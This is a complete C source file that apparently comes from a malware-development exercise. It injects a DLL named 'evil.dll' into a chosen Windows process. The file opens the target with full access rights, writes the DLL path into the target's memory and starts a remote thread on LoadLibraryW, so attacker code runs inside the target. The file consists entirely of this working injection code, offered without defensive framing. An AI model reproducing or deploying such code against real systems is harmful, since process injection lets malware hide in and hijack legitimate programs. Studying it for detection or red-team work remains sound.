#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>


DWORD PID,TID = NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;
HMODULE hKernel32 = NULL;

wchar_t dllPath[MAX_PATH] = L"C:\\Users\\User\\Desktop\\Maldev\\tests\\dllInjection\\evil.dll";
size_t dllPathSize = sizeof(dllPath);
int main(int argc, char* argv[]) {
   
   PID = atoi(argv[1]);//arguments are string, so we need to convert it to integer
   printf("handle the process %ld\n",PID);
   hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE, PID); //Gets handle of the process with given PID
   if(hProcess == NULL)
    {
        printf("handle error %d\n",GetLastError());
        return EXIT_FAILURE;
    }
    printf("success: 0x%p\n",hProcess);


    rBuffer = VirtualAllocEx(hProcess, NULL, dllPathSize, (MEM_COMMIT | MEM_RESERVE),PAGE_READWRITE); //Allocating memory in target process
    if(rBuffer == NULL)
    {
        printf("buffer error %d\n",GetLastError());
        return EXIT_FAILURE;
    }

    WriteProcessMemory(hProcess, rBuffer, dllPath, dllPathSize, NULL);//Writes our dll path to the allocated memory
    hKernel32 = GetModuleHandleW(L"Kernel32");//imports kernel32 as we will need its loadlibrary function
    if(hKernel32 == NULL)
    {
        printf("kernel loading error %d\n",GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    
    LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32,"LoadLibraryW");//imports loadlibrary method
    hThread = CreateRemoteThread(hProcess,NULL,0,startThis,rBuffer,0,&TID);//Creates remoteThread
    if(hThread == NULL)
    {
        printf("thread loading error %d\n",GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    WaitForSingleObject(hThread,INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
